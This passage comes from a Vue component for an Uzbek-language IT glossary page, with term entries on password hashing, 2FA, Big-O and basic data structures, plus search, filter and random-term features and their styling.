    term: 'Hash & Salt',
    full: 'Parollarni xeshlash va tuzlash',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Kriptografiya',
    uz_def: 'Parollarni bazada ochiq matn ko‘rinishida emas, orqaga qaytarib bo‘lmaydigan matematik formula (Bcrypt, Argon2) va tasodifiy tuz (Salt) bilan shifrlab saqlash.',
    analogy: 'Go‘shtni maydalagichdan chiqarib qiymaga aylantirish — qiymani orqaga qaytarib yana butun go‘sht qilib bo‘lmaydi.',
    code: `import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())`
  },
  {
    id: 'mfa',
    term: '2FA / MFA',
    full: 'Two-Factor Authentication',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Xavfsizlik',
    uz_def: 'Tizimga kirishda faqat parol emas, balki ikkinchi xavfsizlik bosqichi (SMS kod, Google Authenticator)ni talab qilish.',
    analogy: 'Eshikni ochish uchun faqat kalit emas, qo‘shimcha barmoq izi skaneri ham kerak bo‘lishi.',
    code: `1. Login/Parol to'g'ri -> 2. 6 xonali TOTP kod tekshiriladi`
  },

  // ========================================================
  // 8. COMPUTER SCIENCE & FOUNDATION
  // ========================================================
  {
    id: 'big_o',
    term: 'Big-O Notation',
    full: 'Algoritmik Murakkablik belgisi',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Algoritm',
    uz_def: 'Ma’lumotlar hajmi (N) oshib borgan sari algoritm qancha vaqt (Time) yoki xotira (Space) talab qilishini baholovchi matematik belgi (O(1), O(log N), O(N), O(N²)).',
    analogy: 'Telefon kitobidan ismni qidirish tezligi: varaqlab qidirish O(log N) vs har bir odamni bittalab ko‘rib chiqish O(N).',
    code: `O(1)      - Eng tez (doimiy vaqt)\nO(log N)  - Binary Search\nO(N)      - Oddiy qidiruv\nO(N^2)    - Bubble Sort`
  },
  {
    id: 'stack_lifo',
    term: 'Stack (LIFO)',
    full: 'Last In, First Out (Stak tuzilmasi)',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Tuzilma',
    uz_def: 'Eng oxirgi qo‘shilgan element eng birinchi bo‘lib olinadigan ma’lumotlar tuzilmasi (amallar: push va pop).',
    analogy: 'Likopchalar taxlami yoki kitoblar taxlami — eng ustiga qo‘ygan kitobingizni birinchi bo‘lib olasiz.',
    code: `const stack = [];\nstack.push(10); // qo'shish\nconst top = stack.pop(); // olish -> 10`
  },
  {
    id: 'queue_fifo',
    term: 'Queue (FIFO)',
    full: 'First In, First Out (Navbat tuzilmasi)',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Tuzilma',
    uz_def: 'Birinchi bo‘lib kelgan element birinchi bo‘lib chiqadigan ma’lumotlar tuzilmasi (amallar: enqueue va dequeue).',
    analogy: 'Do‘kon kassasidagi navbat: birinchi kelgan xaridorga birinchi xizmat ko‘rsatiladi.',
    code: `const queue = [];\nqueue.push(10); // enqueue\nconst first = queue.shift(); // dequeue -> 10`
  },
  {
    id: 'linked_list',
    term: 'Linked List',
    full: 'Zanjirli ro‘yxat',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Tuzilma',
    uz_def: 'Xotirada yonma-yon joylashishi shart bo‘lmagan, har bir tugun (Node) o‘z qiymati va keyingi tugun manzilini (pointer) saqlaydigan ro‘yxat.',
    analogy: 'Poyezd vagonlari: har bir vagon o‘zidan keyingi vagonga zanjir orqali ulangan.',
    code: `class Node {\n  constructor(val) {\n    this.val = val;\n    this.next = null;\n  }\n}`
  },
  {
    id: 'recursion',
    term: 'Recursion',
    full: 'Rekursiya',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Dasturlash',
    uz_def: 'Funksiyaning o‘z-o‘zini chaqirishi. To‘xtash sharti (Base Case) bo‘lishi shart, aks holda xotira to‘lib Stack Overflow yuz beradi.',
    analogy: 'Bir-birining ichiga joylashtirilgan rus matryoshka qo‘g‘irchoqlari — eng oxirgi mitti qo‘g‘irchoqqacha ochib boriladi.',
    code: `function faktorial(n) {\n  if (n <= 1) return 1; // to'xtash sharti\n  return n * faktorial(n - 1);\n}`
  },
  {
    id: 'hash_table',
    term: 'Hash Table',
    full: 'Xesh-jadval (Lug‘at / Map)',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Tuzilma',
    uz_def: 'Kalit (Key) orqali qiymatni (Value) bir zumda O(1) vaqtda topish imkonini beruvchi juda tezkor ma’lumotlar tuzilmasi.',
    analogy: 'Kiyim iladigan kiyimxona raqamchasi: raqamga qarab darhol aynan sizning kiyimingizni topib berishadi.',
    code: `const scores = new Map();\nscores.set("Ali", 95);\nconsole.log(scores.get("Ali")); // 95`
  },
  {
    id: 'garbage_collector',
    term: 'Garbage Collection (GC)',
    full: 'Xotirani avtomatik tozalovchi',
    cat: 'cs',
    catName: 'CS & Foundation',
    tag: 'Xotira',
    uz_def: 'Dastur ishlashida xotirada ortiqcha foydalanilmayotgan obyektlarni aniqlab, xotirani avtomatik bo‘shatib beruvchi tizim (JS, Python, Java).',
    analogy: 'Xonadonda yig‘ilib qolgan chiqindilarni jadval bo‘yicha tozalab olib ketuvchi farrosh.',
    code: `let obj = { name: "test" };\nobj = null; // Obyekt xotiradan GC orqali o'chiriladi`
  }
]

// State
const searchQuery = ref<string>('')
const selectedCategory = ref<string>('all')
const selectedLetter = ref<string>('all')
const copiedId = ref<string | null>(null)
const randomModalOpen = ref<boolean>(false)
const randomTerm = ref<TermItem | null>(null)

// Alphabet list
const alphabet = ['all', ...Array.from(new Set(TERMS.map(t => t.term[0].toUpperCase()))).sort()]

// Filtered terms
const filteredTerms = computed(() => {
  const q = searchQuery.value.toLowerCase().trim()
  return TERMS.filter(item => {
    const matchCat = selectedCategory.value === 'all' || item.cat === selectedCategory.value
    const matchLetter = selectedLetter.value === 'all' || item.term[0].toUpperCase() === selectedLetter.value
    const matchQuery = !q ||
      item.term.toLowerCase().includes(q) ||
      item.full.toLowerCase().includes(q) ||
      item.uz_def.toLowerCase().includes(q) ||
      item.tag.toLowerCase().includes(q) ||
      item.analogy.toLowerCase().includes(q)

    return matchCat && matchLetter && matchQuery
  })
})

const copySnippet = (id: string, text: string) => {
  navigator.clipboard.writeText(text)
  copiedId.value = id
  setTimeout(() => {
    copiedId.value = null
  }, 2000)
}

const openRandomTerm = () => {
  const rand = TERMS[Math.floor(Math.random() * TERMS.length)]
  randomTerm.value = rand
  randomModalOpen.value = true
}
</script>

<template>
  <div class="axv glossary-page">
    <Crumbs :items="[{ t: 'Bosh sahifa', l: '/' }, { t: 'IT Glossariy va Cheat-Sheet' }]" />

    <!-- Hero Header -->
    <header class="glossary-hero">
      <div class="gh-badge">
        <span class="pulse-dot"></span>
        <span>Atamalar xazinasi & Cheat-Sheet</span>
      </div>
      <h1>Interaktiv IT Glossariy</h1>
      <p class="gh-sub">
        Barcha yo'nalishlar (Web, Back-end, Android, BI, Game, IoT, Cyber, Foundation) bo'yicha eng muhim atamalar, sodda hayotiy o'xshatishlar va amaliy kod namunalari.
      </p>

      <div class="gh-actions">
        <button class="btn btn-primary btn-lg" @click="openRandomTerm">
          <Icon name="sparkles" /> Tasodifiy atama bilan bilimni sinash
        </button>
      </div>
    </header>

    <!-- Search and Filter Bar -->
    <div class="filter-wrapper">
      <div class="search-box">
        <span class="sb-icon"><Icon name="search" /></span>
        <input
          v-model="searchQuery"
          type="text"
          placeholder="Atama, qisqartma yoki kalit so'zni qidiring (masalan: API, Docker, Big-O, CORS, LIFO)..."
        />
        <button v-if="searchQuery" class="clear-btn" @click="searchQuery = ''">✕</button>
      </div>

      <!-- Categories Pills -->
      <div class="categories-scroll">
        <button
          v-for="cat in CATEGORIES"
          :key="cat.id"
          class="cat-pill"
          :class="{ active: selectedCategory === cat.id }"
          @click="selectedCategory = cat.id"
        >
          <Icon :name="cat.icon" />
          <span>{{ cat.name }}</span>
          <span class="cat-count">
            {{ cat.id === 'all' ? TERMS.length : TERMS.filter(t => t.cat === cat.id).length }}
          </span>
        </button>
      </div>

      <!-- Letter Filter Bar -->
      <div class="letter-bar">
        <button
          v-for="l in alphabet"
          :key="l"
          class="letter-btn"
          :class="{ active: selectedLetter === l }"
          @click="selectedLetter = l"
        >
          {{ l === 'all' ? 'BARCHASI' : l }}
        </button>
      </div>
    </div>

    <!-- Results Info -->
    <div class="results-stats">
      <span>Topilgan atamalar soni: <b>{{ filteredTerms.length }}</b> ta</span>
      <span v-if="searchQuery || selectedCategory !== 'all' || selectedLetter !== 'all'" class="reset-link" @click="searchQuery = ''; selectedCategory = 'all'; selectedLetter = 'all'">
        Filtrlarni tozalash
      </span>
    </div>

    <!-- Terms Grid -->
    <div v-if="filteredTerms.length > 0" class="terms-grid">
      <article
        v-for="item in filteredTerms"
        :key="item.id"
        class="term-card"
      >
        <div class="tc-top">
          <div class="tc-term-group">
            <h2 class="tc-term">{{ item.term }}</h2>
            <span class="tc-cat-badge" :class="'cat-' + item.cat">{{ item.catName }}</span>
          </div>
          <span class="tc-tag">{{ item.tag }}</span>
        </div>

        <div class="tc-full">{{ item.full }}</div>

        <p class="tc-def">{{ item.uz_def }}</p>

        <!-- Real life analogy block -->
        <div class="tc-analogy">
          <span class="an-icon"><Icon name="lightbulb" /></span>
          <div class="an-text">
            <b>Hayotiy o'xshatish:</b> {{ item.analogy }}
          </div>
        </div>

        <!-- Code snippet if present -->
        <div v-if="item.code" class="tc-code-block">
          <div class="cb-header">
            <span>Namuna / Cheat-Sheet</span>
            <button class="copy-btn" @click="copySnippet(item.id, item.code)">
              <Icon :name="copiedId === item.id ? 'check' : 'clipboard-list'" />
              <span>{{ copiedId === item.id ? 'Nusxalandi!' : 'Nusxa' }}</span>
            </button>
          </div>
          <pre><code>{{ item.code }}</code></pre>
        </div>
      </article>
    </div>

    <!-- Empty State -->
    <div v-else class="empty-state">
      <span class="es-icon"><Icon name="circle-question-mark" /></span>
      <h3>Hech qanday atama topilmadi</h3>
      <p>"{{ searchQuery }}" so'rovi bo'yicha hech qanday ma'lumot chiqmadi. Qidiruv so'zini o'zgartirib ko'ring.</p>
      <button class="btn btn-primary" @click="searchQuery = ''; selectedCategory = 'all'; selectedLetter = 'all'">
        Barcha atamalarni ko'rish
      </button>
    </div>

    <!-- Random Term Modal -->
    <div v-if="randomModalOpen && randomTerm" class="modal-overlay" @click.self="randomModalOpen = false">
      <div class="modal-card">
        <div class="modal-header">
          <div class="m-badge"><Icon name="sparkles" /> Kun atamasi / Tasodifiy tanlov</div>
          <button class="close-btn" @click="randomModalOpen = false">✕</button>
        </div>

        <div class="modal-body">
          <div class="modal-title-row">
            <h2>{{ randomTerm.term }}</h2>
            <span class="tc-cat-badge" :class="'cat-' + randomTerm.cat">{{ randomTerm.catName }}</span>
          </div>
          <p class="modal-full">{{ randomTerm.full }}</p>

          <div class="modal-sec">
            <h4><Icon name="book-open" /> Ta'rif:</h4>
            <p>{{ randomTerm.uz_def }}</p>
          </div>

          <div class="modal-sec analogy-sec">
            <h4><Icon name="lightbulb" /> Hayotiy o'xshatish:</h4>
            <p>{{ randomTerm.analogy }}</p>
          </div>

          <div v-if="randomTerm.code" class="tc-code-block">
            <div class="cb-header">
              <span>Namuna</span>
              <button class="copy-btn" @click="copySnippet('modal', randomTerm.code)">
                <Icon :name="copiedId === 'modal' ? 'check' : 'clipboard-list'" />
                <span>{{ copiedId === 'modal' ? 'Nusxalandi!' : 'Nusxa' }}</span>
              </button>
            </div>
            <pre><code>{{ randomTerm.code }}</code></pre>
          </div>
        </div>

        <div class="modal-footer">
          <button class="btn btn-ghost" @click="randomModalOpen = false">Yopish</button>
          <button class="btn btn-primary" @click="openRandomTerm">
            <Icon name="rotate-ccw" /> Boshqa atama
          </button>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.glossary-page {
  padding-bottom: 80px;
}

.glossary-hero {
  text-align: center;
  margin: 30px auto 40px;
  max-width: 800px;
}

.gh-badge {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 6px 16px;
  background: var(--vp-c-brand-soft, rgba(30, 144, 255, 0.12));
  border: 1px solid var(--vp-c-brand, #3b82f6);
  border-radius: 20px;
  font-size: 0.88rem;
  font-weight: 600;
  color: var(--vp-c-brand, #3b82f6);
  margin-bottom: 16px;
}

.pulse-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #10b981;
  box-shadow: 0 0 8px #10b981;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
  70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
  100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
}

.glossary-hero h1 {
  font-size: 2.4rem;
  font-weight: 800;
  margin-bottom: 12px;
  background: linear-gradient(135deg, var(--vp-c-text-1) 30%, var(--vp-c-brand, #3b82f6) 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

.gh-sub {
  font-size: 1.05rem;
  color: var(--vp-c-text-2);
  line-height: 1.6;
  margin-bottom: 24px;
}

.gh-actions {
  display: flex;
  justify-content: center;
  gap: 12px;
}

/* Filter & Search Bar */
.filter-wrapper {
  background: var(--vp-c-bg-soft, #1e1e1e);
  border: 1px solid var(--vp-c-divider, #333);
  border-radius: 16px;
  padding: 20px;
  margin-bottom: 24px;
}

.search-box {
  position: relative;
  display: flex;
  align-items: center;
  margin-bottom: 16px;
}

.sb-icon {
  position: absolute;
  left: 14px;
  color: var(--vp-c-text-3);
  display: flex;
  align-items: center;
  pointer-events: none;
}

.search-box input {
  width: 100%;
  padding: 14px 44px 14px 44px;
  background: var(--vp-c-bg, #141414);
  border: 1px solid var(--vp-c-divider, #3e3e42);
  border-radius: 10px;
  font-size: 1rem;
  color: var(--vp-c-text-1);
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.search-box input:focus {
  border-color: var(--vp-c-brand, #3b82f6);
  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
}

.clear-btn {
  position: absolute;
  right: 14px;
  background: transparent;
  border: none;
  color: var(--vp-c-text-3);
  cursor: pointer;
  font-size: 1rem;
  padding: 4px;
}

.categories-scroll {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-bottom: 16px;
}

.cat-pill {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 8px 14px;
  background: var(--vp-c-bg, #252526);
  border: 1px solid var(--vp-c-divider, #3e3e42);
  border-radius: 20px;
  font-size: 0.88rem;
  font-weight: 500;
  color: var(--vp-c-text-2);
  cursor: pointer;
  transition: all 0.2s;
}

.cat-pill:hover {
  border-color: var(--vp-c-brand, #3b82f6);
  color: var(--vp-c-text-1);
}

.cat-pill.active {
  background: var(--vp-c-brand, #3b82f6);
  border-color: var(--vp-c-brand, #3b82f6);
  color: #fff;
}

.cat-count {
  font-size: 0.75rem;
  background: rgba(0, 0, 0, 0.2);
  padding: 2px 6px;
  border-radius: 10px;
}

.letter-bar {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
  padding-top: 12px;
  border-top: 1px dashed var(--vp-c-divider, #333);
}

.letter-btn {
  padding: 4px 8px;
  background: transparent;
  border: 1px solid transparent;
  border-radius: 6px;
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--vp-c-text-3);
  cursor: pointer;
  transition: all 0.15s;
}

.letter-btn:hover {
  color: var(--vp-c-text-1);
  background: rgba(255, 255, 255, 0.05);
}

.letter-btn.active {
  background: var(--vp-c-brand-soft, rgba(59, 130, 246, 0.2));
  border-color: var(--vp-c-brand, #3b82f6);
  color: var(--vp-c-brand, #3b82f6);
}

.results-stats {
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 0.9rem;
  color: var(--vp-c-text-2);
  margin-bottom: 16px;
  padding: 0 4px;
}

.reset-link {
  color: var(--vp-c-brand, #3b82f6);
  cursor: pointer;
  text-decoration: underline;
}

/* Terms Grid */
.terms-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
  gap: 18px;
}

.term-card {
  background: var(--vp-c-bg-soft, #1e1e1e);
  border: 1px solid var(--vp-c-divider, #333);
  border-radius: 14px;
  padding: 20px;
  display: flex;
  flex-direction: column;
  transition: transform 0.2s, box-shadow 0.2s, border-color 0.2s;
}

.term-card:hover {
  transform: translateY(-2px);
  border-color: var(--vp-c-brand, #3b82f6);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
}

.tc-top {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 8px;
  margin-bottom: 6px;
}

.tc-term-group {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap;
}

.tc-term {
  font-size: 1.35rem;
  font-weight: 800;
  color: var(--vp-c-text-1);
  margin: 0;
  font-family: var(--vp-font-family-mono, monospace);
}

.tc-cat-badge {
  font-size: 0.72rem;
  font-weight: 600;
  padding: 2px 8px;
  border-radius: 6px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.cat-web { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
.cat-backend { background: rgba(16, 185, 129, 0.15); color: #34d399; }
.cat-android { background: rgba(34, 197, 94, 0.15); color: #4ade80; }
.cat-bi { background: rgba(168, 85, 247, 0.15); color: #c084fc; }
.cat-game { background: rgba(245, 158, 11, 0.15); color: #fbbf24; }
.cat-iot { background: rgba(236, 72, 153, 0.15); color: #f472b6; }
.cat-cyber { background: rgba(239, 68, 68, 0.15); color: #f87171; }
.cat-cs { background: rgba(14, 165, 233, 0.15); color: #38bdf8; }

.tc-tag {
  font-size: 0.75rem;
  color: var(--vp-c-text-3);
  background: var(--vp-c-bg, #252526);
  padding: 2px 8px;
  border-radius: 4px;
}

.tc-full {
  font-size: 0.88rem;
  font-weight: 600;
  color: var(--vp-c-brand, #3b82f6);
  margin-bottom: 12px;
}

.tc-def {
  font-size: 0.95rem;
  color: var(--vp-c-text-1);
  line-height: 1.5;
  margin-bottom: 14px;
  flex-grow: 1;
}

.tc-analogy {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  background: rgba(234, 179, 8, 0.08);
  border-left: 3px solid #eab308;
  padding: 10px 12px;
  border-radius: 0 8px 8px 0;
  margin-bottom: 14px;
  font-size: 0.88rem;
  color: var(--vp-c-text-2);
  line-height: 1.45;
}

.an-icon {
  color: #eab308;
  display: flex;
  margin-top: 2px;
}

.tc-code-block {
  background: var(--vp-c-bg, #121212);
  border: 1px solid var(--vp-c-divider, #2d2d30);
  border-radius: 8px;
  overflow: hidden;
  font-family: var(--vp-font-family-mono, monospace);
  font-size: 0.82rem;
}

.cb-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 6px 10px;
  background: rgba(255, 255, 255, 0.03);
  border-bottom: 1px solid var(--vp-c-divider, #2d2d30);
  color: var(--vp-c-text-3);
  font-size: 0.75rem;
}

.copy-btn {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: transparent;
  border: none;
  color: var(--vp-c-brand, #3b82f6);
  cursor: pointer;
  font-size: 0.75rem;
  padding: 2px 6px;
  border-radius: 4px;
}

.copy-btn:hover {
  background: rgba(59, 130, 246, 0.1);
}

.tc-code-block pre {
  margin: 0;
  padding: 10px 12px;
  overflow-x: auto;
  color: #d4d4d4;
  line-height: 1.4;
}

/* Empty State */
.empty-state {
  text-align: center;
  padding: 60px 20px;
  background: var(--vp-c-bg-soft, #1e1e1e);
  border-radius: 16px;
  margin: 20px 0;
}

.es-icon {
  font-size: 3rem;
  color: var(--vp-c-text-3);
  display: flex;
  justify-content: center;
  margin-bottom: 16px;
}

/* Modal */
.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.7);
  backdrop-filter: blur(4px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 999;
  padding: 20px;
}

.modal-card {
  background: var(--vp-c-bg, #1e1e1e);
  border: 1px solid var(--vp-c-divider, #333);
  border-radius: 16px;
  max-width: 600px;
  width: 100%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
  display: flex;
  flex-direction: column;
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 16px 20px;
  border-bottom: 1px solid var(--vp-c-divider, #333);
}

.m-badge {
  display: flex;
  align-items: center;
  gap: 6px;
  color: #eab308;
  font-weight: 600;
  font-size: 0.9rem;
}

.close-btn {
  background: transparent;
  border: none;
  color: var(--vp-c-text-3);
  font-size: 1.2rem;
  cursor: pointer;
}

.modal-body {
  padding: 20px;
}

.modal-title-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 4px;
}

.modal-title-row h2 {
  font-size: 1.8rem;
  font-weight: 800;
  margin: 0;
}

.modal-full {
  font-size: 1rem;
  font-weight: 600;
  color: var(--vp-c-brand, #3b82f6);
  margin-bottom: 20px;
}

.modal-sec {
  margin-bottom: 16px;
}

.modal-sec h4 {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 0.95rem;
  margin: 0 0 6px;
  color: var(--vp-c-text-2);
}

.modal-sec p {
  font-size: 1rem;
  color: var(--vp-c-text-1);
  line-height: 1.5;
  margin: 0;
}

.analogy-sec {
  background: rgba(234, 179, 8, 0.08);
  border-left: 3px solid #eab308;
  padding: 12px;
  border-radius: 0 8px 8px 0;
}

.modal-footer {
  display: flex;
  justify-content: flex-end;
  gap: 10px;
  padding: 16px 20px;
  border-top: 1px solid var(--vp-c-divider, #333);
}

@media (max-width: 768px) {
  .terms-grid {
    grid-template-columns: 1fr;
  }
  .glossary-hero h1 {
    font-size: 1.8rem;
  }
  .filter-wrapper {
    padding: 14px;
  }
}
</style>
